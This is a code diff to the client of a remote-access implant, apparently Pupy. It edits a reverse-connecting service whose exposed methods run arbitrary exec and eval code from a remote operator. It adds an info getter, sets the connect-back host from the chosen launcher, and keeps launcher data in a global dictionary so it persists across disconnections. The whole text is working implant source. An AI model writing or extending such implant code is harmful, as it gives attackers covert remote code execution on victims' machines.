@@ -80,6 +80,15 @@ class ReverseSlaveService(Service):
 	def exposed_execute(self, text):
 		"""execute arbitrary code (using ``exec``)"""
 		execute(text, self.exposed_namespace)
+
+	def exposed_get_infos(self, s):
+		"""execute arbitrary code (using ``exec``)"""
+		import pupy
+		if not s in pupy.infos:
+			return None
+		return pupy.infos[s]
+
+
 	def exposed_eval(self, text):
 		"""evaluate arbitrary code (using ``eval``)"""
 		return eval(text, self.exposed_namespace)
@@ -121,27 +130,34 @@ def main():
 		args=parser.parse_args()
 		LAUNCHER=args.launcher
 		LAUNCHER_ARGS=shlex.split(' '.join(args.launcher_args))
+
+	if not LAUNCHER in conf.launchers:
+		exit("No such launcher: %s"%LAUNCHER)
+
 	if "windows" in platform.system().lower():
 		try:
 			import pupy
 			config_file=pupy.get_pupy_config()
 			exec config_file in globals()
-			pupy.get_connect_back_host=(lambda: HOST)
 		except ImportError:
 			logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
-	#else:
-	#	add_pseudo_pupy_module(HOST)
-
-	if not LAUNCHER in conf.launchers:
-		exit("No such launcher: %s"%LAUNCHER)
 
 	launcher=conf.launchers[LAUNCHER]()
 	try:
 		launcher.parse_args(LAUNCHER_ARGS)
-	except LauncherError:
-		exit()
+	except LauncherError as e:
+		launcher.arg_parser.print_usage()
+		exit(str(e))
+
 	if "pupy" not in sys.modules:
 		add_pseudo_pupy_module(launcher.get_host())
+	else:
+		pupy.get_connect_back_host=launcher.get_host
+
+	import pupy
+	pupy.infos={} #global dictionary to store informations persistent through a deconnection
+	pupy.infos['launcher']=LAUNCHER
+	pupy.infos['launcher_args']=LAUNCHER_ARGS
 		
 	attempt=0
 	while True:
